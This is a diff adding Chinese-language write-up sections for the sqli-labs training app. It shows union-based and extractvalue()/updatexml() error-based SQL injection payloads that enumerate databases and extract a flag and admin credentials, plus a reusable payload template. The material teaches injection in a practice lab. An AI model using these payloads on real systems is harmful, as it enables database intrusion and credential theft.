@@ -86,7 +86,37 @@
 
 > <img src="https://github.com/Ki1z/CTF/blob/main/IMG/H90A2JO{XJOXV6ONEHAK~_1.png?raw=true">
 
-获取到管理员账号密码，注入成功
+获取到管理员账号密码，注入成功。但是我们还要获取flag，下面查询所有数据库名
+
+```sql
+?id=0' union select 1,2,group_concat(schema_name) from information_schema.schemata %23
+```
+
+> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/$YM6ZO66$9C$$3Z{DUDM81G.png?raw=true">
+
+发现其中有个库为 `ctftraining` ，查询其所有表
+
+```sql
+?id=0' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='ctftraining' %23
+```
+
+> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/BBMSO8$525$6428_4EW_R%K.png?raw=true">
+
+发现ctf表，查询字段
+
+```sql
+?id=0' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='ctftraining' and table_name='flag' %23
+```
+
+> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/@GMO9NS1CTG0PKL_IN2]V(1.png?raw=true">
+
+查询字段信息，成功获取flag。以下获取flag步骤省略。
+
+```sql
+?id=0' union select 1,2,flag from ctftraining.flag %23
+```
+
+> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/_RWECF[QFCL{[P$QO2IQ5CP.png?raw=true">
 
 ### Less-2
 
@@ -432,3 +462,80 @@ Less-17的页面和之前不同，是一个密码更改的页面
 
 > <img src="https://github.com/Ki1z/CTF/blob/main/IMG/S5](]DQT490GF%%1(3`[[QY.png?raw=true">
 
+尝试正常输入，用户名为admin，密码为1
+
+> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/%FF50WGD7Y5D8DR}}MCYB8Q.png?raw=true">
+
+提示更改密码成功，试试在密码栏构造sql注入语句
+
+> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/L${R2XDM9BW2_{MJAE1(J1S.png?raw=true">
+
+出现报错，推测此题可能对username栏进行了过滤，换一个用户名尝试
+
+> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/~W[4Q@VB1QV3`J{[U%@L8CD.png?raw=true">
+
+无报错信息，将username栏置空尝试
+
+> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/9_D6Z)(T68Y{QF[R1W7P4M8.png?raw=true">
+
+#### Extractvalue()
+
+同样没有报错信息，确定对username栏进行了过滤，且必须是数据库中存在的用户名，下面使用 `extractvalue()` 报错注入，先查询数据库
+
+```sql
+1' and (extractvalue(1,concat(0x5c,database())))#
+```
+
+> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/5])S`A6VB5TUR@1JOKTCZ8Q.png?raw=true">
+
+*注： `extractvalue(arg1, arg2)` 函数在arg1中获取符合arg2格式的值，若arg2格式错误，则会返回报错信息，此题的报错信息就是不存在\security格式。concat()类似于group_concat()*
+
+查询所有表
+
+```sql
+1' and (extractvalue(1,concat(0x5c,(select group_concat(table_name) from information_schema.tables where table_schema=database()))))#
+```
+
+> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/T_8){0I%HAPAJ_B`56J1QAH.png?raw=true">
+
+查询字段
+
+```sql
+1' and (extractvalue(1,concat(0x5c,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'))))#
+```
+
+> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/JM4DA(QH)5P6G_O7ZTR1H9L.png?raw=true">
+
+查询字段内容
+
+```sql
+1' and (extractvalue(1,concat(0x5c,(select group_concat(username,' ',password) from security.users where username='admin'))))#
+```
+
+> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/56`8Y%NQR`)X64RBLU[)VZG.png?raw=true">
+
+*注：报错信息有长度限制，如果使用id查询，请指定具体id，以下是查询所有结果的页面*
+
+> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/L~R9MU]93G5Y8CSS%8%B2QT.png?raw=true">
+
+*注：注入语句为 `1' and (extractvalue(1,concat(0x5c,<(Sql Injection Statement)>)))#`*
+
+#### Updatexml()
+
+`updatexml()` 函数和 `extractvalue()` 类似，只是语法有所不同
+
+查询第一个数据库名
+
+```sql
+1' and (updatexml(1,concat(0x5c,(select schema_name from information_schema.schemata limit 0,1)),1))#
+```
+
+*注：`updatexml(arg1, arg2, arg3)` 函数在arg1中获取符合arg2格式的值，更新为arg3。arg2为Xpath格式*
+
+> <img src="https://github.com/Ki1z/CTF/blob/main/IMG/BM%0MS$7%EJA~EN~V{H}LSK.png?raw=true">
+
+#### Group By
+
+
+
+### Less-18
